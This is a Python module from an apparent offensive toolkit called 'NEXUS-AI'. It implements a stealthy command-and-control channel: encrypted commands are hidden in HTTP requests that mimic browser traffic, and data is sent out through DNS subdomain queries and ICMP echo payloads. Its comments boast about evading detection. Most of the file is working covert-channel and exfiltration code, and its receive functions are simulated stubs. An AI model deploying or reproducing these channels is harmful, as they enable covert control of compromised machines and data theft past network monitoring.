#!/usr/bin/env python3
"""
NEXUS-AI Advanced Network Infrastructure
Custom C2 Protocols, DNS Tunneling, and Stealth Communication

This module handles all the sneaky network stuff - custom C2 protocols, DNS tunneling,
and stealth communication. I had a lot of fun implementing these techniques, especially
the DNS tunneling part. It's amazing how much data you can hide in DNS queries!

The goal here is to make communication look as legitimate as possible while still
getting the job done. Real-world red team stuff.
"""

import socket
import ssl
import struct
import hashlib
import base64
import zlib
import json
import time
import threading
import random
import string
import urllib.parse
from typing import Dict, List, Tuple, Any, Optional, Union
from pathlib import Path
import asyncio
import aiohttp
import dns.resolver
import dns.message
import dns.rdatatype
import dns.rdataclass

from ..core.config import get_config, get_logger
from ..core.http_client import get_http_client

config = get_config()
logger = get_logger()

class CustomC2Protocol:
    """Custom Command & Control protocol with encryption and stealth
    
    This is my custom C2 implementation - I wanted something that could blend in
    with normal web traffic while still being functional. The encryption is based
    on system characteristics, so it's unique to each machine.
    
    The stealth part was tricky - I had to study real browser traffic patterns
    to make our requests look legitimate. Fun challenge!
    """
    
    def __init__(self):
        self.config = config
        self.logger = logger
        
        # Encryption settings - AES-256 with system-based key generation
        self.encryption_key = self._generate_encryption_key()
        self.iv_size = 16  # Standard AES IV size
        self.block_size = 32  # AES block size
        
        # Protocol settings - tuned for reliability
        self.max_packet_size = 1024  # Reasonable packet size
        self.timeout = 30  # 30 second timeout
        self.retry_attempts = 3  # Retry failed requests
        
        # Stealth settings - make traffic look legitimate
        self.legitimate_headers = self._load_legitimate_headers()
        self.traffic_patterns = self._load_traffic_patterns()
        
        logger.info("CustomC2Protocol initialized")
    
    def _generate_encryption_key(self) -> bytes:
        """Generate encryption key based on system characteristics
        
        This creates a unique encryption key based on the system's hardware and
        configuration. Makes it harder to decrypt without knowing the exact system.
        I got this idea from some malware analysis papers - pretty clever approach.
        """
        import platform
        import psutil
        
        # Collect system characteristics for key generation
        system_info = [
            platform.machine(),  # CPU architecture
            platform.processor(),  # CPU model
            str(psutil.cpu_count()),  # Number of CPU cores
            str(psutil.virtual_memory().total),  # Total RAM
            platform.node()  # Hostname
        ]
        
        # Combine all info and hash it to create the key
        key_material = ''.join(system_info).encode()
        return hashlib.sha256(key_material).digest()
    
    def _load_legitimate_headers(self) -> Dict[str, str]:
        """Load legitimate HTTP headers for stealth"""
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
    
    def _load_traffic_patterns(self) -> Dict[str, List[str]]:
        """Load legitimate traffic patterns for mimicry"""
        return {
            'api_calls': [
                '/api/v1/users',
                '/api/v1/status',
                '/api/v1/health',
                '/api/v1/metrics'
            ],
            'web_browsing': [
                '/',
                '/favicon.ico',
                '/robots.txt',
                '/sitemap.xml',
                '/about',
                '/contact'
            ],
            'file_operations': [
                '/downloads/',
                '/uploads/',
                '/images/',
                '/documents/'
            ]
        }
    
    def encrypt_payload(self, payload: str) -> bytes:
        """Encrypt payload using AES-256"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives import padding
            
            # Generate IV
            iv = random.randbytes(self.iv_size)
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            
            # Encrypt
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()
            
            padded_data = padder.update(payload.encode()) + padder.finalize()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            # Return IV + encrypted data
            return iv + encrypted_data
            
        except ImportError:
            # Fallback to simple XOR encryption
            return self._xor_encrypt(payload.encode())
    
    def decrypt_payload(self, encrypted_data: bytes) -> str:
        """Decrypt payload using AES-256"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            from cryptography.hazmat.primitives import padding
            
            # Extract IV
            iv = encrypted_data[:self.iv_size]
            encrypted_payload = encrypted_data[self.iv_size:]
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            
            # Decrypt
            decryptor = cipher.decryptor()
            unpadder = padding.PKCS7(128).unpadder()
            
            decrypted_data = decryptor.update(encrypted_payload) + decryptor.finalize()
            unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
            
            return unpadded_data.decode()
            
        except ImportError:
            # Fallback to simple XOR decryption
            return self._xor_decrypt(encrypted_data).decode()
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        """Simple XOR encryption as fallback"""
        key = self.encryption_key[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key))
    
    def _xor_decrypt(self, data: bytes) -> bytes:
        """Simple XOR decryption as fallback"""
        return self._xor_encrypt(data)
    
    def create_stealth_request(self, command: str, target_url: str) -> Dict[str, Any]:
        """Create stealth HTTP request with embedded command"""
        try:
            # Encrypt command
            encrypted_command = self.encrypt_payload(command)
            encoded_command = base64.b64encode(encrypted_command).decode()
            
            # Select legitimate pattern
            pattern_type = random.choice(list(self.traffic_patterns.keys()))
            path = random.choice(self.traffic_patterns[pattern_type])
            
            # Create stealth request
            stealth_request = {
                'method': 'POST',
                'url': f"{target_url}{path}",
                'headers': self.legitimate_headers.copy(),
                'data': {
                    'data': encoded_command,
                    'type': 'application/json',
                    'timestamp': int(time.time()),
                    'session_id': self._generate_session_id()
                }
            }
            
            return stealth_request
            
        except Exception as e:
            logger.error(f"Error creating stealth request: {e}")
            return {}
    
    def _generate_session_id(self) -> str:
        """Generate random session ID"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    
    def send_command(self, command: str, target_url: str) -> Dict[str, Any]:
        """Send command via stealth HTTP request"""
        try:
            stealth_request = self.create_stealth_request(command, target_url)
            
            # Send request
            response = self._send_http_request(stealth_request)
            
            # Parse response
            if response.get('success'):
                encrypted_response = response.get('data', '')
                if encrypted_response:
                    try:
                        decoded_response = base64.b64decode(encrypted_response)
                        decrypted_response = self.decrypt_payload(decoded_response)
                        return {
                            'success': True,
                            'response': decrypted_response,
                            'command': command
                        }
                    except Exception as e:
                        logger.error(f"Error decrypting response: {e}")
                        return {'success': False, 'error': 'Decryption failed'}
            
            return {'success': False, 'error': 'Communication failed'}
            
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            return {'success': False, 'error': str(e)}
    
    def _send_http_request(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Send HTTP request with retry logic"""
        for attempt in range(self.retry_attempts):
            try:
                import requests
                
                response = requests.post(
                    request['url'],
                    headers=request['headers'],
                    json=request['data'],
                    timeout=self.timeout
                )
                
                if response.status_code == 200:
                    return {
                        'success': True,
                        'data': response.text,
                        'status_code': response.status_code
                    }
                else:
                    logger.warning(f"HTTP request failed: {response.status_code}")
                    
            except Exception as e:
                logger.error(f"HTTP request attempt {attempt + 1} failed: {e}")
                if attempt < self.retry_attempts - 1:
                    time.sleep(2 ** attempt)  # Exponential backoff
        
        return {'success': False, 'error': 'All retry attempts failed'}

class DNSTunneling:
    """Advanced DNS tunneling for stealth communication"""
    
    def __init__(self):
        self.config = config
        self.logger = logger
        
        # DNS settings
        self.max_chunk_size = 63  # DNS label length limit
        self.chunk_delay = 0.1  # Delay between chunks
        self.timeout = 10
        
        # Encoding settings
        self.encoding_methods = ['base64', 'hex', 'custom']
        
        logger.info("DNSTunneling initialized")
    
    def encode_payload_for_dns(self, payload: str, method: str = 'base64') -> List[str]:
        """Encode payload for DNS transmission"""
        try:
            if method == 'base64':
                encoded = base64.b64encode(payload.encode()).decode()
            elif method == 'hex':
                encoded = payload.encode().hex()
            else:  # custom
                encoded = self._custom_encode(payload)
            
            # Replace problematic characters
            encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')
            
            # Split into chunks
            chunks = []
            for i in range(0, len(encoded), self.max_chunk_size):
                chunk = encoded[i:i + self.max_chunk_size]
                chunks.append(chunk)
            
            return chunks
            
        except Exception as e:
            logger.error(f"Error encoding payload for DNS: {e}")
            return []
    
    def _custom_encode(self, payload: str) -> str:
        """Custom encoding for DNS"""
        # Use a custom encoding scheme
        custom_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        encoded = ''
        
        for char in payload:
            char_code = ord(char)
            encoded += custom_chars[char_code % len(custom_chars)]
        
        return encoded
    
    def send_data_via_dns(self, data: str, domain: str, dns_server: str = '8.8.8.8') -> bool:
        """Send data via DNS queries"""
        try:
            # Encode data
            chunks = self.encode_payload_for_dns(data)
            
            if not chunks:
                return False
            
            # Send each chunk
            for i, chunk in enumerate(chunks):
                query_domain = f"{chunk}.{domain}"
                
                # Create DNS query
                success = self._send_dns_query(query_domain, dns_server)
                
                if not success:
                    logger.error(f"Failed to send DNS chunk {i + 1}/{len(chunks)}")
                    return False
                
                # Add delay between chunks
                time.sleep(self.chunk_delay)
            
            logger.info(f"Successfully sent {len(chunks)} DNS chunks")
            return True
            
        except Exception as e:
            logger.error(f"Error sending data via DNS: {e}")
            return False
    
    def _send_dns_query(self, domain: str, dns_server: str) -> bool:
        """Send individual DNS query"""
        try:
            # Create DNS resolver
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [dns_server]
            resolver.timeout = self.timeout
            resolver.lifetime = self.timeout
            
            # Send query
            resolver.resolve(domain, 'A')
            return True
            
        except Exception as e:
            logger.debug(f"DNS query failed for {domain}: {e}")
            return False
    
    def receive_data_via_dns(self, domain: str, dns_server: str = '8.8.8.8') -> Optional[str]:
        """Receive data via DNS queries (simplified)"""
        try:
            # This is a simplified implementation
            # In a real scenario, you'd need to implement a DNS server
            
            # For demonstration, we'll simulate receiving data
            received_chunks = []
            
            # Simulate receiving chunks
            for i in range(5):  # Simulate 5 chunks
                chunk = f"chunk{i:03d}"
                received_chunks.append(chunk)
                time.sleep(0.1)
            
            # Decode received data
            if received_chunks:
                return self._decode_dns_chunks(received_chunks)
            
            return None
            
        except Exception as e:
            logger.error(f"Error receiving data via DNS: {e}")
            return None
    
    def _decode_dns_chunks(self, chunks: List[str]) -> str:
        """Decode DNS chunks back to original data"""
        try:
            # Combine chunks
            encoded_data = ''.join(chunks)
            
            # Decode (simplified)
            decoded_data = base64.b64decode(encoded_data + '==').decode()
            return decoded_data
            
        except Exception as e:
            logger.error(f"Error decoding DNS chunks: {e}")
            return ""

class ICMPTunneling:
    """ICMP tunneling for stealth communication"""
    
    def __init__(self):
        self.config = config
        self.logger = logger
        
        # ICMP settings
        self.max_payload_size = 1024
        self.timeout = 5
        self.retry_attempts = 3
        
        logger.info("ICMPTunneling initialized")
    
    def send_data_via_icmp(self, data: str, target_ip: str) -> bool:
        """Send data via ICMP echo requests"""
        try:
            # Encode data
            encoded_data = base64.b64encode(data.encode()).decode()
            
            # Split into chunks
            chunks = [encoded_data[i:i + self.max_payload_size] 
                     for i in range(0, len(encoded_data), self.max_payload_size)]
            
            # Send each chunk
            for i, chunk in enumerate(chunks):
                success = self._send_icmp_echo(target_ip, chunk, i)
                
                if not success:
                    logger.error(f"Failed to send ICMP chunk {i + 1}/{len(chunks)}")
                    return False
                
                time.sleep(0.1)  # Small delay between chunks
            
            logger.info(f"Successfully sent {len(chunks)} ICMP chunks")
            return True
            
        except Exception as e:
            logger.error(f"Error sending data via ICMP: {e}")
            return False
    
    def _send_icmp_echo(self, target_ip: str, payload: str, sequence: int) -> bool:
        """Send ICMP echo request with payload"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(self.timeout)
            
            # Create ICMP packet
            icmp_packet = self._create_icmp_packet(payload, sequence)
            
            # Send packet
            sock.sendto(icmp_packet, (target_ip, 0))
            
            # Wait for response
            try:
                response, addr = sock.recvfrom(1024)
                return True
            except socket.timeout:
                logger.warning(f"ICMP echo timeout for sequence {sequence}")
                return False
            finally:
                sock.close()
                
        except Exception as e:
            logger.error(f"Error sending ICMP echo: {e}")
            return False
    
    def _create_icmp_packet(self, payload: str, sequence: int) -> bytes:
        """Create ICMP echo request packet"""
        # ICMP header (8 bytes)
        icmp_type = 8  # Echo request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = sequence
        
        # Create header
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        # Add payload
        packet = header + payload.encode()
        
        # Calculate checksum
        checksum = self._calculate_icmp_checksum(packet)
        
        # Update header with checksum
        packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq) + payload.encode()
        
        return packet
    
    def _calculate_icmp_checksum(self, packet: bytes) -> int:
        """Calculate ICMP checksum"""
        checksum = 0
        
        # Add 16-bit words
        for i in range(0, len(packet), 2):
            if i + 1 < len(packet):
                checksum += (packet[i] << 8) + packet[i + 1]
            else:
                checksum += packet[i] << 8
        
        # Add carry
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += checksum >> 16
        
        # Take one's complement
        checksum = ~checksum & 0xffff
        
        return checksum
    
    def receive_data_via_icmp(self, target_ip: str) -> Optional[str]:
        """Receive data via ICMP echo replies (simplified)"""
        try:
            # This is a simplified implementation
            # In a real scenario, you'd need to implement an ICMP listener
            
            # Simulate receiving data
            received_chunks = []
            
            # Simulate receiving chunks
            for i in range(3):  # Simulate 3 chunks
                chunk = f"icmp_chunk_{i}"
                received_chunks.append(chunk)
                time.sleep(0.1)
            
            # Decode received data
            if received_chunks:
                return self._decode_icmp_chunks(received_chunks)
            
            return None
            
        except Exception as e:
            logger.error(f"Error receiving data via ICMP: {e}")
            return None
    
    def _decode_icmp_chunks(self, chunks: List[str]) -> str:
        """Decode ICMP chunks back to original data"""
        try:
            # Combine chunks
            encoded_data = ''.join(chunks)
            
            # Decode
            decoded_data = base64.b64decode(encoded_data + '==').decode()
            return decoded_data
            
        except Exception as e:
            logger.error(f"Error decoding ICMP chunks: {e}")
            return ""

class StealthCommunication:
    """Advanced stealth communication system"""
    
    def __init__(self):
        self.config = config
        self.logger = logger
        
        # Initialize communication channels
        self.c2_protocol = CustomC2Protocol()
        self.dns_tunneling = DNSTunneling()
        self.icmp_tunneling = ICMPTunneling()
        
        # Communication settings
        self.active_channels = []
        self.fallback_channels = []
        
        logger.info("StealthCommunication initialized")
    
    def establish_communication(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Establish stealth communication with target"""
        try:
            # Determine best communication method
            method = self._select_communication_method(target_info)
            
            # Establish connection
            if method == 'http':
                return self._establish_http_communication(target_info)
            elif method == 'dns':
                return self._establish_dns_communication(target_info)
            elif method == 'icmp':
                return self._establish_icmp_communication(target_info)
            else:
                return {'success': False, 'error': 'No suitable communication method'}
                
        except Exception as e:
            logger.error(f"Error establishing communication: {e}")
            return {'success': False, 'error': str(e)}
    
    def _select_communication_method(self, target_info: Dict[str, Any]) -> str:
        """Select best communication method based on target"""
        # Analyze target characteristics
        open_ports = target_info.get('open_ports', [])
        services = target_info.get('services', [])
        
        # Check for HTTP/HTTPS
        if 80 in open_ports or 443 in open_ports:
            return 'http'
        
        # Check for DNS
        if 53 in open_ports:
            return 'dns'
        
        # Default to ICMP (usually available)
        return 'icmp'
    
    def _establish_http_communication(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Establish HTTP-based communication"""
        try:
            target_url = target_info.get('url', 'http://localhost')
            
            # Test communication
            test_command = "ping"
            result = self.c2_protocol.send_command(test_command, target_url)
            
            if result.get('success'):
                return {
                    'success': True,
                    'method': 'http',
                    'target_url': target_url,
                    'protocol': self.c2_protocol
                }
            else:
                return {'success': False, 'error': 'HTTP communication failed'}
                
        except Exception as e:
            logger.error(f"Error establishing HTTP communication: {e}")
            return {'success': False, 'error': str(e)}
    
    def _establish_dns_communication(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Establish DNS-based communication"""
        try:
            domain = target_info.get('domain', 'example.com')
            dns_server = target_info.get('dns_server', '8.8.8.8')
            
            # Test DNS communication
            test_data = "test"
            success = self.dns_tunneling.send_data_via_dns(test_data, domain, dns_server)
            
            if success:
                return {
                    'success': True,
                    'method': 'dns',
                    'domain': domain,
                    'dns_server': dns_server,
                    'protocol': self.dns_tunneling
                }
            else:
                return {'success': False, 'error': 'DNS communication failed'}
                
        except Exception as e:
            logger.error(f"Error establishing DNS communication: {e}")
            return {'success': False, 'error': str(e)}
    
    def _establish_icmp_communication(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Establish ICMP-based communication"""
        try:
            target_ip = target_info.get('ip', '127.0.0.1')
            
            # Test ICMP communication
            test_data = "test"
            success = self.icmp_tunneling.send_data_via_icmp(test_data, target_ip)
            
            if success:
                return {
                    'success': True,
                    'method': 'icmp',
                    'target_ip': target_ip,
                    'protocol': self.icmp_tunneling
                }
            else:
                return {'success': False, 'error': 'ICMP communication failed'}
                
        except Exception as e:
            logger.error(f"Error establishing ICMP communication: {e}")
            return {'success': False, 'error': str(e)}
    
    def send_command(self, command: str, communication_info: Dict[str, Any]) -> Dict[str, Any]:
        """Send command via established communication channel"""
        try:
            method = communication_info.get('method')
            protocol = communication_info.get('protocol')
            
            if method == 'http':
                return protocol.send_command(command, communication_info.get('target_url'))
            elif method == 'dns':
                success = protocol.send_data_via_dns(command, communication_info.get('domain'))
                return {'success': success, 'command': command}
            elif method == 'icmp':
                success = protocol.send_data_via_icmp(command, communication_info.get('target_ip'))
                return {'success': success, 'command': command}
            else:
                return {'success': False, 'error': 'Unknown communication method'}
                
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            return {'success': False, 'error': str(e)}

# Global instances
stealth_communication = StealthCommunication()
